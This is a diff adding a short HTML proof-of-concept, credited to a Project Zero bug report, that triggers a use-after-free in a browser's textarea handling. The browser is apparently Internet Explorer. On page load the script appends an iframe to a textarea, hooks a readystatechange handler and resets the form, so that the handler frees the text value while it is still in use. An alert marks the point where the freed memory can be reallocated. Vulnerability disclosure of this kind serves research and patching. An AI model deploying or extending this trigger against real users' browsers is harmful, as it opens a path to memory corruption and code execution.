@@ -1,0 +1,24 @@
+<!-- https://bugs.chromium.org/p/project-zero/issues/detail?id=1076 -->
+<!-- Author: Ivan Fratric -->
+<!-- saved from url=(0014)about:internet -->
+<script>
+
+function run() {
+  var textarea = document.getElementById("textarea");
+  var frame = document.createElement("iframe");
+
+  textarea.appendChild(frame);
+
+  frame.contentDocument.onreadystatechange = eventhandler;
+  form.reset();
+}
+
+function eventhandler() {
+  document.getElementById("textarea").defaultValue = "foo";
+  alert("Text value freed, can be reallocated here");
+}
+
+</script>
+<body onload=run()>
+<form id="form">
+<textarea id="textarea" cols="80">aaaaaaaaaaaaaaaaaaaaaaa</textarea>
